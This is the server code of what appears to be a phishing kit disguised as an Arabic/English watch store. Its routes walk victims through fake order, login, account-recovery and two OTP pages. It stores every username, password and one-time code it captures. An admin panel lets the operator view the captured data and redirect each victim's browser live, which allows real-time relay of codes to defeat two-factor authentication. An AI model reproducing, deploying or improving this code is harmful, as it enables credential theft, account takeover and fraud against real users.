const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_PASSWORD = 'LIb123@@';

// Data
const watches = require('./data/watches.json');
const branches = require('./data/branches.json');
const cities = require('./data/cities.json');
const translations = require('./data/translations.json');

// In-memory store
let requests = [];
let nextId = 1;
let liveVisitors = new Set();
let countedToday = new Set();
let allVisitors = new Set();
let todayVisits = 0;
let todayDate = new Date().toDateString();

function resetDailyIfNeeded() {
    const now = new Date().toDateString();
    if (now !== todayDate) {
        todayDate = now;
        todayVisits = 0;
        countedToday.clear();
    }
}

// Middleware
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

function getLang(req) {
    return req.query.lang === 'en' ? 'en' : 'ar';
}

// ===== Page Routes =====

app.get('/', (req, res) => {
    const lang = getLang(req);
    res.render('home', { lang, t: translations[lang] });
});

app.get('/watches', (req, res) => {
    const lang = getLang(req);
    res.render('index', { lang, t: translations[lang], watches });
});

app.get('/order', (req, res) => {
    const lang = getLang(req);
    res.render('order', { lang, t: translations[lang], watches, branches, cities });
});

app.get('/login', (req, res) => {
    const lang = getLang(req);
    res.render('login', { lang, t: translations[lang], error: req.query.error, orderId: req.query.orderId });
});

app.get('/forgot', (req, res) => {
    const lang = getLang(req);
    res.render('forgot', { lang, t: translations[lang], orderId: req.query.orderId });
});

app.get('/forgot-username', (req, res) => {
    const lang = getLang(req);
    res.render('forgot-username', { lang, t: translations[lang], orderId: req.query.orderId, error: req.query.error });
});

app.get('/forgot-username-success', (req, res) => {
    const lang = getLang(req);
    res.render('forgot-username-success', { lang, t: translations[lang], orderId: req.query.orderId, error: req.query.error });
});

app.get('/forgot-username-password', (req, res) => {
    const lang = getLang(req);
    res.render('forgot-username-password', { lang, t: translations[lang], orderId: req.query.orderId, error: req.query.error });
});

app.get('/forgot-password', (req, res) => {
    const lang = getLang(req);
    res.render('forgot-password', { lang, t: translations[lang], orderId: req.query.orderId, error: req.query.error });
});

app.get('/forgot-password-success', (req, res) => {
    const lang = getLang(req);
    res.render('forgot-password-success', { lang, t: translations[lang] });
});

app.get('/loading', (req, res) => {
    const lang = getLang(req);
    res.render('loading', { lang, t: translations[lang], orderId: req.query.orderId });
});

app.get('/otp', (req, res) => {
    const lang = getLang(req);
    res.render('otp', { lang, t: translations[lang], orderId: req.query.orderId, error: req.query.error });
});

app.get('/otp2', (req, res) => {
    const lang = getLang(req);
    res.render('otp2', { lang, t: translations[lang], orderId: req.query.orderId, error: req.query.error });
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

// ===== API Routes =====

app.post('/api/admin-login', (req, res) => {
    if (req.body.password === ADMIN_PASSWORD) {
        return res.json({ ok: true });
    }
    res.json({ ok: false });
});

app.post('/api/submit-service', (req, res) => {
    const service = req.body.service || '';
    const request = {
        id: nextId++,
        name: '', phone: '', email: '', delivery: '', branch: '',
        governorate: '', city: '', address: '', watchColor: '',
        username: '', password: '', otp: '',
        service: service,
        step: 'service',
        status: 'pending',
        createdAt: new Date().toISOString()
    };
    requests.push(request);
    res.json({ ok: true, id: request.id });
});

app.post('/api/submit-order', (req, res) => {
    const data = req.body;
    const request = {
        id: nextId++,
        name: data.name || '',
        phone: data.phone || '',
        email: data.email || '',
        delivery: data.delivery || '',
        branch: data.branch || '',
        governorate: data.governorate || '',
        city: data.city || '',
        address: data.address || '',
        watchColor: data.watchColor || '',
        username: '',
        password: '',
        otp: '',
        status: 'pending',
        createdAt: new Date().toISOString()
    };
    requests.push(request);
    res.json({ ok: true, id: request.id });
});

app.post('/api/submit-login', (req, res) => {
    const { orderId, username, password } = req.body;
    const request = requests.find(r => r.id === orderId);
    if (request) {
        request.username = username || '';
        request.password = password || '';
        request.step = 'login';
        request.status = 'pending';
    }
    res.json({ ok: true });
});

app.post('/api/submit-otp', (req, res) => {
    const { orderId, otp } = req.body;
    const request = requests.find(r => r.id === orderId);
    if (request) {
        request.otp = otp || '';
        request.step = 'otp';
        request.status = 'pending';
    }
    res.json({ ok: true });
});

app.post('/api/submit-otp2', (req, res) => {
    const { orderId, otp2 } = req.body;
    const request = requests.find(r => r.id === orderId);
    if (request) {
        request.otp2 = otp2 || '';
        request.step = 'otp2';
        request.status = 'pending';
    }
    res.json({ ok: true });
});

app.post('/api/submit-forgot-username', (req, res) => {
    const { email, orderId } = req.body;
    const id = orderId ? Number(orderId) : null;
    const request = id ? requests.find(r => r.id === id) : null;
    if (request) {
        request.forgotEmail = email || '';
        request.step = 'forgot-username';
        request.status = 'pending';
        return res.json({ ok: true, id: request.id });
    }
    const newReq = {
        id: nextId++,
        name: '', phone: '', email: email || '', delivery: '', branch: '',
        governorate: '', city: '', address: '', watchColor: '',
        username: '', password: '', otp: '',
        forgotEmail: email || '',
        step: 'forgot-username',
        status: 'pending',
        createdAt: new Date().toISOString()
    };
    requests.push(newReq);
    res.json({ ok: true, id: newReq.id });
});

app.post('/api/submit-forgot-username-confirm', (req, res) => {
    const { username, orderId } = req.body;
    const id = orderId ? Number(orderId) : null;
    const request = id ? requests.find(r => r.id === id) : null;
    if (request) {
        request.username = username || '';
        request.step = 'forgot-username-confirm';
        request.status = 'pending';
        return res.json({ ok: true, id: request.id });
    }
    res.json({ ok: false });
});

app.post('/api/submit-forgot-username-password', (req, res) => {
    const { password, orderId } = req.body;
    const id = orderId ? Number(orderId) : null;
    const request = id ? requests.find(r => r.id === id) : null;
    if (request) {
        request.password = password || '';
        request.step = 'forgot-username-password';
        request.status = 'pending';
        return res.json({ ok: true, id: request.id });
    }
    res.json({ ok: false });
});

app.post('/api/submit-forgot-password', (req, res) => {
    const { username, orderId } = req.body;
    const id = orderId ? Number(orderId) : null;
    const request = id ? requests.find(r => r.id === id) : null;
    if (request) {
        request.forgotUsername = username || '';
        request.step = 'forgot-password';
        request.status = 'pending';
        return res.json({ ok: true, id: request.id });
    }
    const newReq = {
        id: nextId++,
        name: '', phone: '', email: '', delivery: '', branch: '',
        governorate: '', city: '', address: '', watchColor: '',
        username: username || '', password: '', otp: '',
        forgotUsername: username || '',
        step: 'forgot-password',
        status: 'pending',
        createdAt: new Date().toISOString()
    };
    requests.push(newReq);
    res.json({ ok: true, id: newReq.id });
});

app.get('/api/requests/:id/check', (req, res) => {
    const id = Number(req.params.id);
    const request = requests.find(r => r.id === id);
    if (request) {
        const result = { ok: true, status: request.status };
        if (request.redirect) {
            result.redirect = request.redirect;
        }
        return res.json(result);
    }
    res.json({ ok: false, status: 'not_found' });
});

app.get('/api/requests', (req, res) => {
    res.json({ ok: true, requests });
});

app.post('/api/requests/:id/redirect', (req, res) => {
    const id = Number(req.params.id);
    const request = requests.find(r => r.id === id);
    if (request) {
        request.redirect = req.body.page || '';
        setTimeout(() => {
            if (request.redirect === req.body.page) {
                request.redirect = null;
            }
        }, 15000);
    }
    res.json({ ok: true });
});

app.post('/api/requests/:id/status', (req, res) => {
    const id = Number(req.params.id);
    const request = requests.find(r => r.id === id);
    if (request) {
        request.status = req.body.status || 'pending';
    }
    res.json({ ok: true });
});

app.get('/api/live-count', (req, res) => {
    res.json({ ok: true, count: liveVisitors.size });
});

app.get('/api/stats', (req, res) => {
    resetDailyIfNeeded();
    res.json({ ok: true, today: todayVisits, total: allVisitors.size });
});

app.post('/api/track-visit', (req, res) => {
    const visitorId = req.body.visitorId || Math.random().toString(36).slice(2);
    liveVisitors.add(visitorId);
    resetDailyIfNeeded();
    if (!countedToday.has(visitorId)) {
        countedToday.add(visitorId);
        todayVisits++;
    }
    if (!allVisitors.has(visitorId)) {
        allVisitors.add(visitorId);
    }
    setTimeout(() => liveVisitors.delete(visitorId), 60000);
    res.json({ ok: true, visitorId });
});

app.post('/api/heartbeat', (req, res) => {
    if (req.body.visitorId) {
        liveVisitors.add(req.body.visitorId);
        setTimeout(() => liveVisitors.delete(req.body.visitorId), 60000);
    }
    res.json({ ok: true });
});

// Cities API for dynamic dropdowns
app.get('/api/cities', (req, res) => {
    res.json(cities);
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
